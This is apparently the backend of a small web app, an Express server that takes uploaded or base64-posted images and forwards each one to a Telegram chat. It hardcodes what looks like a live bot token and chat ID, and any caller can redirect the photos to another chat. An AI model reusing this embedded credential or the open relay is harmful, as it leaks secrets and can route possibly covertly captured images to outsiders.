require('dotenv').config({ path: require('path').join(__dirname, '../.env') });

const express = require('express');
const cors = require('cors');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Resolve static files directory dynamically
const staticPath = fs.existsSync(path.join(__dirname, 'public'))
    ? path.join(__dirname, 'public')
    : (fs.existsSync(path.join(__dirname, '../public'))
        ? path.join(__dirname, '../public')
        : __dirname);

// Middleware - allow large base64 payloads
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(staticPath));

// Multer memory storage for direct file uploads
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Telegram Configuration — fallback if .env is missing in cloud
const BOT_TOKEN = process.env.BOT_TOKEN || '8848454103:AAHHim01x1-A_dYR9vSTECJexQtOSnLUmZY';
const CHAT_ID   = process.env.CHAT_ID || '6370350005';

// Validate Bot Token on Start
axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
    .then(res => {
        console.log(`Bot connected successfully: @${res.data.result.username}`);
    })
    .catch(err => {
        console.error('Warning: Telegram Bot API check failed:', err.message);
    });

// Unified upload handler supporting both base64 JSON and multipart/form-data
async function handleUpload(req, res) {
    try {
        let buffer;
        let mimeType = 'image/jpeg';

        if (req.file) {
            buffer = req.file.buffer;
            mimeType = req.file.mimetype || 'image/jpeg';
        } else if (req.body && req.body.image) {
            const base64Data = req.body.image.replace(/^data:image\/\w+;base64,/, '');
            buffer = Buffer.from(base64Data, 'base64');
        }

        if (!buffer || buffer.length === 0) {
            return res.status(400).json({ error: 'No image data received' });
        }

        let targetChatId = (req.body && req.body.chat_id) || CHAT_ID;
        targetChatId = String(targetChatId).trim();

        console.log(`Sending photo (${buffer.length} bytes) to Telegram chat: ${targetChatId}`);

        const form = new FormData();
        form.append('chat_id', targetChatId);
        form.append('photo', buffer, {
            filename: 'photo.jpg',
            contentType: mimeType,
        });

        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            form,
            {
                headers: {
                    ...form.getHeaders(),
                },
            }
        );

        console.log('Photo sent successfully to Telegram:', telegramResponse.data.ok);
        return res.json({ success: true, telegram: telegramResponse.data.ok });

    } catch (error) {
        console.error('Error sending to Telegram:', error.response ? error.response.data : error.message);
        const telegramError = error.response && error.response.data
            ? (error.response.data.description || JSON.stringify(error.response.data))
            : error.message;

        return res.status(500).json({
            error: `Telegram Error: ${telegramError}`,
            details: error.response ? error.response.data : error.message
        });
    }
}

// Support both /upload and /api/upload
app.post('/upload', upload.single('photo'), handleUpload);
app.post('/api/upload', upload.single('photo'), handleUpload);

// Serve frontend for any other GET requests
app.get('*', (req, res) => {
    const indexPath = path.join(staticPath, 'index.html');
    if (fs.existsSync(indexPath)) {
        res.sendFile(indexPath);
    } else {
        res.sendFile(path.join(__dirname, 'index.html'));
    }
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
